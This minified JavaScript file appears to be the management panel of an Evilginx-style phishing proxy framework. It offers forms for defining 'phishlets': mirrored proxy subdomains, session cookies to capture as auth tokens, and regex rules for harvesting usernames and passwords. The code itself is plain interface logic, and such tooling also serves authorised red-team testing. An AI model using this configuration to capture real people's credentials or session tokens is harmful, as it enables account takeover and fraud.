var phishlets=[],currentProxyHostIndex=0,currentAuthTokenIndex=0;const API_BASE="/api/phishlets";function loadPhishlets(){$.ajax({url:API_BASE,method:"GET",success:function(e){console.log("Loaded phishlets:",e),Array.isArray(e)?phishlets=e:e&&Array.isArray(e.phishlets)?phishlets=e.phishlets:(phishlets=[],console.error("Unexpected phishlets data format:",e)),renderPhishletsList()},error:function(e){showError("Failed to load phishlets: "+(e.responseJSON?.error||"Unknown error"))}})}function renderPhishletsList(){var e=$("#phishletsTableBody");e.empty(),0!==phishlets.length?phishlets.forEach((function(t){let s="string"==typeof t,n=s?t:t.name||"",o=s?"-":t.author||"",i=s?"-":t.min_ver||"",a=s?"-":t.landing_domain||"-";console.log("Rendering phishlet:",n);let r=$("<tr>"),l=$("<td>").text(n),h=$("<td>").text(o),d=$("<td>").text(i),c=$("<td>").text(a);r.append(l),r.append(h),r.append(d),r.append(c),s&&$.ajax({url:API_BASE+"/"+n+"/config",method:"GET",success:function(e){h.text(e.author||"-"),d.text(e.min_ver||"-"),c.text(e.landing_domain||"-")}});let p=$("<td>");p.append($("<button>").addClass("btn btn-sm btn-info").html('<i class="fa fa-eye"></i> View Config').click((function(){viewConfig(n)}))," ",$("<button>").addClass("btn btn-sm btn-primary").html('<i class="fa fa-edit"></i> Edit').click((function(){editPhishlet(n)}))," ",$("<button>").addClass("btn btn-sm btn-success").html('<i class="fa fa-check"></i> Validate').click((function(){validatePhishlet(n)}))," ",$("<button>").addClass("btn btn-sm btn-danger").html('<i class="fa fa-trash"></i>').click((function(){deletePhishlet(n)}))),r.append(p),e.append(r)})):e.append('<tr><td colspan="5" class="text-center">No phishlets found</td></tr>')}function savePhishlet(){var e=$("#phishletEditMode").val(),t=$("#phishletName").val().trim();if(t){var s={name:t,author:$("#phishletAuthor").val().trim(),min_ver:$("#phishletMinVer").val().trim()||"3.3.0",landing_domain:$("#phishletLandingDomain").val().trim(),login:{domain:$("#loginDomain").val().trim(),path:$("#loginPath").val().trim()||"/"}},n=[];$(".proxy-host-item").each((function(){var e=$(this);n.push({phish_sub:e.find(".proxy-phish-sub").val().trim(),orig_sub:e.find(".proxy-orig-sub").val().trim(),domain:e.find(".proxy-domain").val().trim(),session:e.find(".proxy-session").is(":checked"),is_landing:e.find(".proxy-is-landing").is(":checked")})})),n.length>0&&(s.proxy_hosts=n);var o=[];$(".auth-token-item").each((function(){var e=$(this),t=e.find(".auth-keys").val().split(",").map((e=>e.trim())).filter((e=>e));o.push({domain:e.find(".auth-domain").val().trim(),keys:t})})),o.length>0&&(s.auth_tokens=o);var i={},a=$("#credUsernameKey").val().trim(),r=$("#credPasswordKey").val().trim();a&&(i.username={key:a,search:$("#credUsernameSearch").val()||"(.*)",type:$("#credUsernameType").val()}),r&&(i.password={key:r,search:$("#credPasswordSearch").val()||"(.*)",type:$("#credPasswordType").val()}),Object.keys(i).length>0&&(s.credentials=i);var l=API_BASE,h="POST";"edit"===e&&(l+="/"+t,h="PUT"),$.ajax({url:l,method:h,contentType:"application/json",data:JSON.stringify(s),success:function(){showSuccess("Phishlet "+("edit"===e?"updated":"created")+" successfully"),$("#createPhishletModal").modal("hide"),resetPhishletForm(),loadPhishlets()},error:function(e){showError("Failed to save phishlet: "+(e.responseJSON?.error||"Unknown error"))}})}else showError("Phishlet name is required")}function editPhishlet(e){$.ajax({url:API_BASE+"/"+e+"/config",method:"GET",success:function(t){populatePhishletForm(t),$("#phishletEditMode").val("edit"),$("#phishletModalTitle").text("Edit Phishlet: "+e),$("#phishletName").prop("readonly",!0),$("#createPhishletModal").modal("show")},error:function(e){showError("Failed to load phishlet: "+(e.responseJSON?.error||"Unknown error"))}})}function populatePhishletForm(e){$("#phishletName").val(e.name||""),$("#phishletAuthor").val(e.author||""),$("#phishletMinVer").val(e.min_ver||"3.3.0"),$("#phishletLandingDomain").val(e.landing_domain||""),$("#loginDomain").val(e.login?.domain||""),$("#loginPath").val(e.login?.path||"/"),$("#proxyHostsList").empty(),e.proxy_hosts&&e.proxy_hosts.forEach((function(e){addProxyHost(e)})),$("#authTokensList").empty(),e.auth_tokens&&e.auth_tokens.forEach((function(e){addAuthToken(e)})),e.credentials&&(e.credentials.username&&($("#credUsernameKey").val(e.credentials.username.key||""),$("#credUsernameSearch").val(e.credentials.username.search||"(.*)"),$("#credUsernameType").val(e.credentials.username.type||"post")),e.credentials.password&&($("#credPasswordKey").val(e.credentials.password.key||""),$("#credPasswordSearch").val(e.credentials.password.search||"(.*)"),$("#credPasswordType").val(e.credentials.password.type||"post")))}function addProxyHost(e){currentProxyHostIndex++;var t=`\n        <div class="panel panel-default proxy-host-item" style="margin-bottom: 10px;">\n            <div class="panel-body">\n                <button type="button" class="btn btn-xs btn-danger pull-right" onclick="$(this).closest('.proxy-host-item').remove()">\n                    <i class="fa fa-trash"></i>\n                </button>\n                <div class="row">\n                    <div class="col-md-3">\n                        <div class="form-group">\n                            <label>Phish Subdomain</label>\n                            <input type="text" class="form-control proxy-phish-sub" value="${(e=e||{}).phish_sub||""}" placeholder="login">\n                        </div>\n                    </div>\n                    <div class="col-md-3">\n                        <div class="form-group">\n                            <label>Original Subdomain</label>\n                            <input type="text" class="form-control proxy-orig-sub" value="${e.orig_sub||""}" placeholder="login">\n                        </div>\n                    </div>\n                    <div class="col-md-3">\n                        <div class="form-group">\n                            <label>Domain</label>\n                            <input type="text" class="form-control proxy-domain" value="${e.domain||""}" placeholder="example.com">\n                        </div>\n                    </div>\n                    <div class="col-md-3">\n                        <div class="checkbox">\n                            <label>\n                                <input type="checkbox" class="proxy-session" ${e.session?"checked":""}> Session\n                            </label>\n                        </div>\n                        <div class="checkbox">\n                            <label>\n                                <input type="checkbox" class="proxy-is-landing" ${e.is_landing?"checked":""}> Is Landing\n                            </label>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n    `;$("#proxyHostsList").append(t)}function addAuthToken(e){currentAuthTokenIndex++;var t=`\n        <div class="panel panel-default auth-token-item" style="margin-bottom: 10px;">\n            <div class="panel-body">\n                <button type="button" class="btn btn-xs btn-danger pull-right" onclick="$(this).closest('.auth-token-item').remove()">\n                    <i class="fa fa-trash"></i>\n                </button>\n                <div class="row">\n                    <div class="col-md-6">\n                        <div class="form-group">\n                            <label>Domain</label>\n                            <input type="text" class="form-control auth-domain" value="${(e=e||{}).domain||""}" placeholder=".example.com">\n                        </div>\n                    </div>\n                    <div class="col-md-6">\n                        <div class="form-group">\n                            <label>Keys (comma-separated)</label>\n                            <input type="text" class="form-control auth-keys" value="${e.keys?e.keys.join(", "):""}" placeholder="session_token, auth_cookie">\n                        </div>\n                    </div>\n                </div>\n            </div>\n        </div>\n    `;$("#authTokensList").append(t)}function viewConfig(e){$.ajax({url:API_BASE+"/"+e+"/config",method:"GET",success:function(e){$("#configDisplay").text(JSON.stringify(e,null,2)),$("#viewConfigModal").modal("show")},error:function(e){showError("Failed to load configuration: "+(e.responseJSON?.error||"Unknown error"))}})}function validatePhishlet(e){$.ajax({url:API_BASE+"/"+e+"/validate",method:"POST",success:function(t){t.valid?showSuccess("Phishlet '"+e+"' is valid!"):showError("Phishlet validation failed: "+(t.errors?t.errors.join(", "):"Unknown error"))},error:function(e){showError("Failed to validate phishlet: "+(e.responseJSON?.error||"Unknown error"))}})}function deletePhishlet(e){confirm("Are you sure you want to delete the phishlet '"+e+"'?")&&$.ajax({url:API_BASE+"/"+e,method:"DELETE",success:function(){showSuccess("Phishlet deleted successfully"),loadPhishlets()},error:function(e){showError("Failed to delete phishlet: "+(e.responseJSON?.error||"Unknown error"))}})}function resetPhishletForm(){$("#phishletForm")[0].reset(),$("#phishletEditMode").val("create"),$("#phishletModalTitle").text("Create New Phishlet"),$("#phishletName").prop("readonly",!1),$("#proxyHostsList").empty(),$("#authTokensList").empty(),currentProxyHostIndex=0,currentAuthTokenIndex=0}function showSuccess(e){Swal.fire({icon:"success",title:"Success",text:e,timer:3e3})}function showError(e){Swal.fire({icon:"error",title:"Error",text:e})}$(document).ready((function(){loadPhishlets(),$("#searchPhishlets").on("keyup",(function(){var e=$(this).val().toLowerCase();$("#phishletsTableBody tr").filter((function(){$(this).toggle($(this).text().toLowerCase().indexOf(e)>-1)}))}))})),$("#createPhishletModal").on("hidden.bs.modal",(function(){resetPhishletForm()}));